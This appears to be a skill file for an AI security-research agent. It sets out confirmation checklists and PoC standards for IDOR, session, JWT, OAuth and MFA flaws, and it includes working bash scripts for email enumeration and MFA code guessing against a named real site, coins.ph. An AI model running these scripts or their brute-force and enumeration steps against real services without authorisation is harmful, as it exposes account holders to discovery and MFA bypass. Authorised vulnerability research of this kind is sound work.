---
name: auth-reproduce
description: IDOR, access control, auth/session, JWT, OAuth, API versioning. After HUNT confirms exploitable — confirmation, PoC creation, exploit adaptation. Use when testing AUTH vulnerabilities.
---

# SKILL-AUTH-REPRODUCE — Authentication & Authorization Reproduction — REPRODUCE
# Phase Coverage: 11-15, 34
# Vuln Classes: IDOR, Access Control, Auth/Session, JWT, OAuth, API Versioning,
#               Privilege Escalation, Environment Variable Bypass
# Purpose: Confirmation criteria, PoC standards, and Playwright-based reproduction

---

## Confirmation Criteria

A finding in any auth/authz phase is valid ONLY when the following are confirmed:

### Phase 11: IDOR
- [ ] User2 can read User1's object using User2's token (cross-account read)
- [ ] User2 can modify/delete User1's object (cross-account write)
- [ ] Response contains User1-specific data (email, PII, orders, account details)
- [ ] Multiple sequential IDs return valid user data
- [ ] Batch endpoint returns multiple records without proper authorization

### Phase 12: Access Control
- [ ] Low-privilege user can access admin-only endpoints
- [ ] Header-based bypass produces different response than normal request
- [ ] Path normalization bypass reaches restricted resources
- [ ] HTTP method override performs privileged actions

### Phase 13: Auth & Session
- [ ] Cookies missing HttpOnly flag — document.cookie returns session token
- [ ] Cookies missing Secure flag — can be sent over HTTP
- [ ] Cookies missing SameSite — vulnerable to CSRF
- [ ] Tokens stored in localStorage — exfiltratable via XSS
- [ ] Username enumeration confirmed — different responses/timing for valid vs invalid
- [ ] Session token is predictable (timestamp-based, MD5, sequential)
- [ ] Pre-login session ID persists after login (session fixation)
- [ ] Password reset token leaked in API response

### Phase 13A: Email Enumeration
- [ ] Public endpoint returns different responses for valid vs invalid emails
- [ ] `useSimplePwd` field differs based on registration status
- [ ] Response length differs between valid and invalid emails
- [ ] Timing differs between valid and invalid emails
- [ ] Bulk enumeration possible (1000+ emails testable)
- [ ] No rate limiting on enumeration endpoint

### Phase 13B: Public MFA Endpoint
- [ ] MFA endpoint accessible without authentication (no 401)
- [ ] authType=0 triggers 500 Internal Server Error (server crash)
- [ ] No rate limiting (20+ rapid requests all processed)
- [ ] No account lockout (unlimited failed attempts)
- [ ] Combined with GA secret exposure = full MFA bypass chain
- [ ] Response fields documented (status, error, data, params)

### Phase 14: JWT
- [ ] Decoded JWT reveals exploitable claims (weak role, excessive permissions)
- [ ] alg:none token accepted by server
- [ ] Weak secret cracked with hashcat/john
- [ ] RS256→HS256 confusion: token signed with public key as HMAC secret accepted
- [ ] kid injection: path traversal or SQLi in kid field

### Phase 15: OAuth
- [ ] redirect_uri bypass redirects authorization code to attacker-controlled URL
- [ ] Missing state parameter allows CSRF on OAuth flow
- [ ] access_token or id_token leaked via Referer header

### Phase 34: API Security
- [ ] Old API version returns different (less restricted) data than current version
- [ ] Swagger/OpenAPI spec exposes hidden or undocumented endpoints
- [ ] API response includes sensitive fields (password_hash, ssn, api_key)

---

## PoC Standards

Every valid finding MUST include:

1. **Reproducible Proof Script**: A clean `.sh` or `.py` file in `scripts/{SLUG}/` that:
   - Sets TARGET and TOKEN variables at the top
   - Executes the exact request(s) that prove the vulnerability
   - Outputs the evidence (response body, status code, timing)
   - Requires no interactive input

2. **Finding Note**: Markdown file in `findings/{SLUG}/{severity}/{vuln-class}/{title}/` with:
   - Title describing the impact (e.g., "IDOR allows User2 to read User1's PII")
   - CIA impact rating (C:H/I:H for most auth findings)
   - Reproduction steps
   - Evidence: request/response pairs, screenshots, timing data
   - Chain candidates (how this can combine with other findings)

3. **Evidence Artifacts**:
   - For IDOR/JWT: saved API responses showing cross-account access
   - For session: screenshots of cookie flags (from Firefox DevTools)
   - For OAuth: redirect chain showing authorization code reaching attacker URL
   - For API: Swagger spec file or response with sensitive fields
   - For email enum: side-by-side response comparison (valid vs invalid email)
   - For MFA: authType matrix showing crash/error responses

### Email Enumeration PoC Template
```bash
#!/bin/bash
# Email Enumeration PoC — coins.ph
# CIA: C:I — Attacker can determine which emails have accounts
TARGET="https://www.coins.ph"
ENDPOINT="/biz-api/v1/public/user-auth/address-info"

echo "[*] Email Enumeration PoC: $TARGET$ENDPOINT"
echo ""

# Test known valid and invalid emails
for email in "test@test.com" "admin@coins.ph" "fake_999@nothing.io"; do
  RESP=$(curl -sk "$TARGET$ENDPOINT?address=$email" \
    -H "client-type: WEB" \
    -H "Content-Type: application/json")
  STATUS=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['data'].get('useSimplePwd','N/A'))" 2>/dev/null)
  echo "  $email: useSimplePwd=$STATUS"
done

echo ""
echo "[*] Result: Different useSimplePwd values = email enumeration confirmed"
```

### Public MFA Endpoint PoC Template
```bash
#!/bin/bash
# Public MFA Endpoint PoC — coins.ph
# CIA: C:H — Attacker can brute force MFA without authentication
TARGET="https://www.coins.ph"
ENDPOINT="/biz-api/v1/public/security/verify-mfa"

echo "[*] Public MFA Endpoint PoC: $TARGET$ENDPOINT"
echo ""

# Test 1: Public access
echo "[*] Test 1: Public access (no auth)"
curl -sk -X POST "$TARGET$ENDPOINT" \
  -H "client-type: WEB" \
  -H "Content-Type: application/json" \
  -d '{"authType":"ga","code":"123456"}' | python3 -m json.tool

echo ""

# Test 2: authType=0 crash
echo "[*] Test 2: authType=0 (server crash)"
curl -sk -X POST "$TARGET$ENDPOINT" \
  -H "client-type: WEB" \
  -H "Content-Type: application/json" \
  -d '{"authType":0,"code":"123456"}' | python3 -m json.tool

echo ""

# Test 3: Rate limiting
echo "[*] Test 3: Rate limiting (20 rapid requests)"
for i in $(seq 1 20); do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$TARGET$ENDPOINT" \
    -H "client-type: WEB" \
    -H "Content-Type: application/json" \
    -d "{\"authType\":\"ga\",\"code\":\"$i\"}")
  echo -n "$CODE "
done
echo ""

echo ""
echo "[*] Result: No 429 = no rate limiting, no lockout = MFA bypass possible"
```

---

## Playwright MCP Integration

Auth testing requires real browser sessions — Playwright handles cookie jars, Cloudflare, and multi-account switching.

| Auth Phase | Playwright Tool | Playbook |
|------------|----------------|----------|
| **Session Cookie Audit (Phase 13)** | `browser_navigate` → login, `browser_evaluate` → `document.cookie` | Extract all cookies, check flags (HttpOnly, Secure, SameSite) programmatically |
| **localStorage Token Detection (Phase 13)** | `browser_evaluate` → `() => JSON.stringify(localStorage)` | Post-login dump: flag JWT, apiKey, privateKey in localStorage |
| **Multi-Account Testing (Phase 11)** | 2 Playwright tabs → `browser_tabs` | Tab 1: User1 session. Tab 2: User2 session. Test cross-account access. |
| **JWT Decode (Phase 14)** | `browser_evaluate` → decode JWT from localStorage/cookies | Extract and decode JWT in browser without sending to server |
| **OAuth Flow (Phase 15)** | `browser_navigate` to crafted OAuth URL, capture redirect | Test redirect_uri bypass by observing where browser lands |
| **API Version Discovery (Phase 34)** | `browser_evaluate` → `fetch()` to /v1/, /v2/ etc. | Test old API versions from browser context with auth cookies |
| **IDOR Cross-Account (Phase 11)** | `browser_evaluate` → fetch other user's resources | In-browser fetch as User1 to User2's endpoint |
| **Email Enumeration (Phase 13A)** | `browser_navigate` → login page, `browser_evaluate` → test emails | Test address-info endpoint with valid/invalid emails |
| **MFA Endpoint (Phase 13B)** | `browser_navigate` → MFA setup page, `browser_network_requests` | Intercept MFA verification requests, test public access |

### Multi-Account Testing with Playwright Tabs
```
1. browser_navigate(url="https://target.com/login")
2. browser_fill_form → login as User1
3. browser_tabs(action="new", url="https://target.com/login")  → Tab 2
4. browser_fill_form → login as User2
5. browser_tabs(action="select", index=1) → back to Tab 1
6. browser_evaluate → fetch('/api/users/2/profile') with User1 cookies → test IDOR
```

### Session Cookie Security Audit
```
1. browser_navigate → login page, fill credentials, submit
2. browser_network_requests → inspect Set-Cookie headers
3. browser_evaluate →
   () => document.cookie.split(';').map(c => ({
     name: c.split('=')[0].trim(),
     httpOnly: false,  // JS-readable = not HttpOnly
     secure: window.location.protocol === 'https:'
   }))
4. Flag: any token readable by JS → XSS-exfiltratable
5. Flag: missing Secure/SameSite → CSRF risk
```
---

*SKILL-AUTH-REPRODUCE — Part of the acy Agentic Security Research System v3.0*
